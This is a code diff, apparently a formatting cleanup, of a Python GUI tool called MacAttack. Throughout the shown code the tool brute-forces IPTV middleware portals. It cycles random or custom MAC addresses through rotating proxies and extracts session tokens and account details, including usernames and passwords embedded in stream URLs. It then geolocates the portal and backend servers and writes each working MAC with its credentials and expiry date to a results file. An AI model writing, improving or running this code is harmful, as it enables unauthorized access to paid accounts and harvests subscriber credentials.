                 proxies = {"http": selected_proxy, "https": selected_proxy}
             else:
                 selected_proxy = "Your Connection"
-                
-                
-                
-                
+
             mac = self.RandomMacGenerator()  # Generate a random MAC
             if mac == "":
-                    # Show error message
-                    self.stop_button.click()
-                    self.update_error_text_signal.emit("<b>Completed: Custom MACs list is empty</b>")
-                    self.nomacs = 1
-                    self.brute_mac_label.setText("Custom MACs list is empty")
+                # Show error message
+                self.stop_button.click()
+                self.update_error_text_signal.emit(
+                    "<b>Completed: Custom MACs list is empty</b>"
+                )
+                self.nomacs = 1
+                self.brute_mac_label.setText("Custom MACs list is empty")
 
-                    return  # Stop the process if no MACs are available
+                return  # Stop the process if no MACs are available
             serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
             sn = serialnumber[0:13]
             device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
@@ -2782,33 +2808,44 @@ class MacAttack(QMainWindow):
                             "Cache-Control": "no-cache",
                         }
                     )
-                    #random_number = random.randint(100000, 999999)
+                    # random_number = random.randint(100000, 999999)
                     url = f"{self.base_url}/portal.php?action=handshake&type=stb&JsHttpRequest=1-xml"
                     logging.debug(f"{self.base_url}")
                     # If proxy is enabled, the proxy to the session
                     if proxies:
                         macattacksess.proxies.update(proxies)
-                        
-                    
+
                     res = macattacksess.get(url, timeout=timeout, allow_redirects=False)
                     logging.debug(f"Status Code: {res.status_code}")
                     if custommacs:
-                        if (res.status_code == 200 or res.status_code == 204 or res.status_code == 404) and not "REMOTE_ADDR" in res.text and not "Backend not available" in res.text:
+                        if (
+                            (
+                                res.status_code == 200
+                                or res.status_code == 204
+                                or res.status_code == 404
+                            )
+                            and not "REMOTE_ADDR" in res.text
+                            and not "Backend not available" in res.text
+                        ):
                             if self.mac_dict:  # This checks if the deque is not empty
                                 if self.prefer_accuracy_radio.isChecked():
                                     if mac == self.mac_dict[0]:
-                                        # If the mac is first in the pool, pop it. 
+                                        # If the mac is first in the pool, pop it.
                                         self.mac_dict.popleft()  # Pop the first element
                             else:
                                 # Handle the case when the deque is empty
                                 logging.info("Pool is empty, cannot pop anything.")
-                        
-                    logging.info(f"Response Text: {res.text}")  # For HTML content or text
+
+                    logging.info(
+                        f"Response Text: {res.text}"
+                    )  # For HTML content or text
                     logging.debug(f"Response Headers: {res.headers}")
                     if res.text:
                         data = json.loads(res.text)
                         token = data.get("js", {}).get("token")
-                        logging.info(f"TOKEN: {token} MAC: {mac} BASEURL: {self.base_url}")
+                        logging.info(
+                            f"TOKEN: {token} MAC: {mac} BASEURL: {self.base_url}"
+                        )
                         url2 = f"{self.base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
 
                         macattacksess.cookies.update(
@@ -2822,12 +2859,16 @@ class MacAttack(QMainWindow):
                             }
                         )
 
-                        res2 = macattacksess.get(url2, timeout=timeout, allow_redirects=False)
+                        res2 = macattacksess.get(
+                            url2, timeout=timeout, allow_redirects=False
+                        )
 
                         logging.info(f"2Status Code: {res2.status_code}")
-                        logging.info(f"2Response Text: {res2.text}")  # For HTML content or text
+                        logging.info(
+                            f"2Response Text: {res2.text}"
+                        )  # For HTML content or text
                         logging.info(f"2Response Headers: {res2.headers}")
-                               
+
                         if res2.text:
                             data = json.loads(res2.text)
                             if (
@@ -2865,11 +2906,11 @@ class MacAttack(QMainWindow):
                                             cmd_value4 = cmd_value4.replace(
                                                 "ffmpeg ", "", 1
                                             )
-                                            
+
                                             cmd_value4 = cmd_value4.replace(
                                                 "'ffmpeg' ", ""
                                             )
-                                            
+
                                             logging.info(f"CMD Value: {cmd_value4}")
 
                                             # Parse the URL
@@ -2880,11 +2921,8 @@ class MacAttack(QMainWindow):
                                                 if parsed_url.port
                                                 else f"{parsed_url.scheme}://{parsed_url.hostname}"
                                             )
-                                            
 
-                                            logging.debug(
-                                                f"Backend: {domain_and_port}"
-                                            )
+                                            logging.debug(f"Backend: {domain_and_port}")
 
                                             # Extract path parts
                                             path_parts = parsed_url.path.strip(
@@ -2893,13 +2931,17 @@ class MacAttack(QMainWindow):
                                             userfound = 0
                                             username = None
                                             password = None
-                                            
+
                                             if include_user_creds:
                                                 if len(path_parts) >= 3:
                                                     username = path_parts[0]
                                                     password = path_parts[1]
-                                                    logging.debug(f"Username: {username}")
-                                                    logging.debug(f"Password: {password}")
+                                                    logging.debug(
+                                                        f"Username: {username}"
+                                                    )
+                                                    logging.debug(
+                                                        f"Password: {password}"
+                                                    )
                                                     userfound = 1  # Set userfound to 1 if username and password are found
                                         else:
                                             logging.debug(
@@ -2970,19 +3012,19 @@ class MacAttack(QMainWindow):
                                         logging.debug(f"Created at: {created_at}")
 
                                         # Construct the URL for the m3u file
-                                        #m3ufile = f"{self.base_url}/get.php?username={username}&password={password}&type=m3u_plus"
+                                        # m3ufile = f"{self.base_url}/get.php?username={username}&password={password}&type=m3u_plus"
 
                                         # Send a HEAD request to check if the file exists
-                                        #response = macattacksess.head(
+                                        # response = macattacksess.head(
                                         #    m3ufile, timeout=timeout, allow_redirects=False
-                                        #)
+                                        # )
 
                                         # Check the status code to determine if the file exists
-                                        #if response.status_code == 200:
+                                        # if response.status_code == 200:
                                         #    logging.info(f"{m3ufile} exists.")
-                                        #elif response.status_code == 404:
+                                        # elif response.status_code == 404:
                                         #    logging.info("The m3u file does not exist.")
-                                        #else:
+                                        # else:
                                         #    logging.info(
                                         #        f"Received status code {response.status_code}: Unable to check file existence."
                                         #    )
@@ -3010,13 +3052,15 @@ class MacAttack(QMainWindow):
                                         TypeError,
                                         json.decoder.JSONDecodeError,
                                     ) as e:
-                                        logging.info(f"Data parsing error for channels data: {str(e)}")
+                                        logging.info(
+                                            f"Data parsing error for channels data: {str(e)}"
+                                        )
                                         count = 0
                                 # new output changes
 
                                 if count > 0:
                                     logging.info("Mac found")
-  
+
                                     if self.autoloadmac_checkbox.isChecked():
                                         self.hostname_input.setText(self.base_url)
                                         self.mac_input.setText(mac)
@@ -3037,9 +3081,9 @@ class MacAttack(QMainWindow):
 
                                     def get_location(ip_address=""):
                                         # Get location details for an IP address using ipinfo.io API.
-                                        #url = f"https://ipinfo.io/{ip_address}/json"
+                                        # url = f"https://ipinfo.io/{ip_address}/json"
                                         url = f"http://ip-api.com/json/{ip_address}"
-                                        #url = f"http://ip-api.com/json/{ip_address}"
+                                        # url = f"http://ip-api.com/json/{ip_address}"
                                         try:
                                             with no_proxy_environment():  # Bypass the enviroment proxy set in the video player tab
                                                 response = requests.get(url)
@@ -3058,12 +3102,15 @@ class MacAttack(QMainWindow):
                                     # Resolve middleware IP address
                                     parsed_middleware = urlparse(self.base_url)
                                     middleware_hostname = parsed_middleware.hostname
-                                    
+
                                     if include_ip_addresses:
                                         middleware_ip_address = resolve_ip_address(
                                             middleware_hostname, "No Portal?"
                                         )
-                                    if include_ip_addresses and include_location_and_timezone:
+                                    if (
+                                        include_ip_addresses
+                                        and include_location_and_timezone
+                                    ):
                                         # Get the location details for the middleware IP address
                                         middleware_location = get_location(
                                             middleware_ip_address
@@ -3078,13 +3125,13 @@ class MacAttack(QMainWindow):
                                             "Timezone", "Unknown"
                                         )
 
-                                    
-                                    if include_proxy_location and selected_proxy != "Your Connection":
+                                    if (
+                                        include_proxy_location
+                                        and selected_proxy != "Your Connection"
+                                    ):
                                         # Strip the port
                                         proxy_ip = selected_proxy.split(":")[0]
-                                        proxy_location = (
-                                            get_location(proxy_ip)
-                                        )
+                                        proxy_location = get_location(proxy_ip)
                                         proxy_city = (
                                             proxy_location.get("City", "Unknown")
                                             if proxy_location
@@ -3095,8 +3142,7 @@ class MacAttack(QMainWindow):
                                             if proxy_location
                                             else ""
                                         )
-                                        
-                                    
+
                                     current_time = datetime.now().strftime(
                                         "%B %d, %Y, %I:%M %p"
                                     )
@@ -3114,14 +3160,19 @@ class MacAttack(QMainWindow):
                                             )
                                             backend_ip_address = None
 
-                                    if include_backend_info and include_ip_addresses and include_location_and_timezone and backend_ip_address is not None:
+                                    if (
+                                        include_backend_info
+                                        and include_ip_addresses
+                                        and include_location_and_timezone
+                                        and backend_ip_address is not None
+                                    ):
                                         backend_location = (
                                             get_location(backend_ip_address)
                                             if middleware_ip_address
                                             != backend_ip_address
                                             else None
                                         )
-   
+
                                         backend_city = (
                                             backend_location.get("City", "Unknown")
                                             if backend_location
@@ -3138,11 +3189,15 @@ class MacAttack(QMainWindow):
                                             else ""
                                         )
 
-                                    result_message = f"{'~Portal~:':<10} {self.iptv_link}\n"
+                                    result_message = (
+                                        f"{'~Portal~:':<10} {self.iptv_link}\n"
+                                    )
                                     result_message += f"{'MAC Addr:':<10} {mac}\n"
-                                    
+
                                     if include_ip_addresses and middleware_ip_address:
-                                        result_message += f"{'PortalIP:':<10} {middleware_ip_address}"
+                                        result_message += (
+                                            f"{'PortalIP:':<10} {middleware_ip_address}"
+                                        )
 
                                     if (
                                         include_location_and_timezone
@@ -3159,13 +3214,20 @@ class MacAttack(QMainWindow):
                                     if include_deviceids:
                                         result_message += f"{'DeviceID:':<10} {device_id}\n{'SecondID:':<10} {device_id2}\n{'Serial #:':<10} {sn}\n"
 
-                                    if include_backend_info and domain_and_port and middleware_ip_address != backend_ip_address:
-                                        result_message += f"{'Backend :':<10} {domain_and_port}\n"
+                                    if (
+                                        include_backend_info
+                                        and domain_and_port
+                                        and middleware_ip_address != backend_ip_address
+                                    ):
+                                        result_message += (
+                                            f"{'Backend :':<10} {domain_and_port}\n"
+                                        )
                                         if include_ip_addresses and backend_ip_address:
                                             result_message += f"{'IP Addr :':<10} {backend_ip_address}"
                                         if (
                                             include_location_and_timezone
-                                            and middleware_ip_address != backend_ip_address
+                                            and middleware_ip_address
+                                            != backend_ip_address
                                             and backend_city
                                         ):
                                             result_message += (
@@ -3174,22 +3236,29 @@ class MacAttack(QMainWindow):
                                             )
                                         elif include_deviceids:
                                             result_message += "\n"
-                                        
+
                                     if (
                                         include_proxy_used
                                         and selected_proxy != "Your Connection"
                                     ):
-                                        result_message += f"{'Proxy IP:':<10} {selected_proxy}"
+                                        result_message += (
+                                            f"{'Proxy IP:':<10} {selected_proxy}"
+                                        )
 
                                     if (
                                         include_proxy_location
                                         and selected_proxy != "Your Connection"
                                         and include_proxy_used
                                     ):
-                                        result_message += f" ({proxy_city}, {proxy_country})\n"
-                                    elif include_proxy_used and selected_proxy != "Your Connection":
+                                        result_message += (
+                                            f" ({proxy_city}, {proxy_country})\n"
+                                        )
+                                    elif (
+                                        include_proxy_used
+                                        and selected_proxy != "Your Connection"
+                                    ):
                                         result_message += "\n"
-                                        
+
                                     if (
                                         include_user_creds
                                         and username is not None
@@ -3198,18 +3267,28 @@ class MacAttack(QMainWindow):
                                         result_message += f"{'Username:':<10} {username}\n{'Password:':<10} {password}\n"
 
                                     if include_max_connections and max_connections:
-                                        result_message += f"{'Max Conn:':<10} {max_connections}\n"
+                                        result_message += (
+                                            f"{'Max Conn:':<10} {max_connections}\n"
+                                        )
                                     if include_date_found:
-                                        result_message += f"{'Found on:':<10} {current_time}\n"
+                                        result_message += (
+                                            f"{'Found on:':<10} {current_time}\n"
+                                        )
                                     if include_date_created and created_at is not None:
-                                        result_message += f"{'Creation:':<10} {created_at}\n"
+                                        result_message += (
+                                            f"{'Creation:':<10} {created_at}\n"
+                                        )
 
                                     result_message += f"{'Exp date:':<10} {expiry}\n{'Channels:':<10} {count}\n"
 
                                     if not mac in self.recentlyfound:
-                                        self.add_recently_found(mac) # it to the recently found list
+                                        self.add_recently_found(
+                                            mac
+                                        )  # it to the recently found list
                                         # Emit the result message to the output signal
-                                        self.update_output_text_signal.emit(result_message)
+                                        self.update_output_text_signal.emit(
+                                            result_message
+                                        )
 
                                         # Write to file with a single blank line after each output
                                         self.output_file.write(result_message + "\n")
@@ -3227,7 +3306,9 @@ class MacAttack(QMainWindow):
                                             )
                                             self.stop_button.click()
                                 else:
-                                    logging.debug(f"MAC: {mac} connects, but has 0 channels. Bummer.")
+                                    logging.debug(
+                                        f"MAC: {mac} connects, but has 0 channels. Bummer."
+                                    )
                             else:
                                 # self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")
                                 logging.info(f"No JSON response for MAC {mac}")
@@ -3605,7 +3686,7 @@ class MacAttack(QMainWindow):
                             f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Timed out</b>"
                         )
                         # Attempt to remove the proxy if it exceeds the allowed error count
-                        self.remove_proxy(selected_proxy, self.proxy_error_counts)                        
+                        self.remove_proxy(selected_proxy, self.proxy_error_counts)
                         self.update_error_text_signal.emit(
                             f"Error for Proxy: {selected_proxy} : <b>Portal not found</b> couldnt find the portal."
                             # Not removing this to prevent proxy removal in case of a connection error.
@@ -3670,11 +3751,12 @@ class MacAttack(QMainWindow):
                         logging.debug(f"Raw Response Content:\n{mac}\n{res.text}")
                     # self.error_count += 1
                 if "Max retries exceeded with url" in str(e):
-                    #self.update_error_text_signal.emit(f"Error for Proxy: <b>Proxy Rate Limited</b> {selected_proxy}")
-                    #self.temp_remove_proxy(selected_proxy)  # Temp remove the proxy
-                    logging.debug(f"Error for Proxy: Proxy Rate Limited {selected_proxy}")
+                    # self.update_error_text_signal.emit(f"Error for Proxy: <b>Proxy Rate Limited</b> {selected_proxy}")
+                    # self.temp_remove_proxy(selected_proxy)  # Temp remove the proxy
+                    logging.debug(
+                        f"Error for Proxy: Proxy Rate Limited {selected_proxy}"
+                    )
 
-    
     def remove_proxy(self, proxy, proxy_error_counts):
         """Remove a proxy after exceeding error count and update UI."""
         error_limit = self.proxy_remove_errorcount.value()
@@ -3766,53 +3848,56 @@ class MacAttack(QMainWindow):
             filename = f"{sanitized_url}_{current_time}.txt"
             return filename
 
-#    def restore_custom_macs(self):
-#        try:
-#            # Define file path
-#            user_dir = os.path.expanduser("~")
-#            file_path = os.path.join(user_dir, "evilvir.us", "MacAttack.ini")
-#
-#            # Check if the file exists
-#            if not os.path.exists(file_path):
-#                logging.info(f"Configuration file not found: {file_path}")
-#                return
-#
-#            # Load configuration
-#            config = configparser.ConfigParser()
-#            config.read(file_path)
-#
-#            self.custom_macs_textbox.setPlainText(
-#                config.get("Settings", "custom_macs_text")
-#            )
-#            logging.info("Configuration loaded successfully.")
-#
-#        except Exception as e:#
-#            logging.info(f"An error occurred while loading the configuration: {e}")
+    #    def restore_custom_macs(self):
+    #        try:
+    #            # Define file path
+    #            user_dir = os.path.expanduser("~")
+    #            file_path = os.path.join(user_dir, "evilvir.us", "MacAttack.ini")
+    #
+    #            # Check if the file exists
+    #            if not os.path.exists(file_path):
+    #                logging.info(f"Configuration file not found: {file_path}")
+    #                return
+    #
+    #            # Load configuration
+    #            config = configparser.ConfigParser()
+    #            config.read(file_path)
+    #
+    #            self.custom_macs_textbox.setPlainText(
+    #                config.get("Settings", "custom_macs_text")
+    #            )
+    #            logging.info("Configuration loaded successfully.")
+    #
+    #        except Exception as e:#
+    #            logging.info(f"An error occurred while loading the configuration: {e}")
 
     def GiveUp(self):
         self.running = False
-#        if self.restore_custom_macs_checkbox.isChecked():
-            # Reload the custom macs, after a delay
-#            QTimer.singleShot(1000, self.restore_custom_macs)
-        
+        #        if self.restore_custom_macs_checkbox.isChecked():
+        # Reload the custom macs, after a delay
+        #            QTimer.singleShot(1000, self.restore_custom_macs)
+
         self.killthreads()
         QTimer.singleShot(
-            15000, 
+            15000,
             lambda: (
-                self.start_button.setDisabled(False) 
-                if not self.stop_button.isEnabled() else None
-            )
+                self.start_button.setDisabled(False)
+                if not self.stop_button.isEnabled()
+                else None
+            ),
         )  # enable start_button if stop_button is disabled
-        
+
         # Disable further user input immediately
         logging.info("GiveUp initiated: Preparing to stop threads.")
-        
+
         # Disable buttons while stopping threads
         self.stop_button.setDisabled(True)
-        
+
         # Delay for updating the brute_mac_label
         if self.proxy_enabled_checkbox.isChecked():
-            if self.nomacs == 0: # Dont show if it was stopped because no mac addresses in custom list
+            if (
+                self.nomacs == 0
+            ):  # Dont show if it was stopped because no mac addresses in custom list
                 QTimer.singleShot(
                     3500,
                     lambda: self.brute_mac_label.setText(
@@ -4748,7 +4833,7 @@ class MacAttack(QMainWindow):
     def closeEvent(self, event):
         self.videoPlayer.stop()
         self.SaveTheDay()
-        #self.GiveUp()
+        # self.GiveUp()
         os._exit(0)
         event.accept()
 
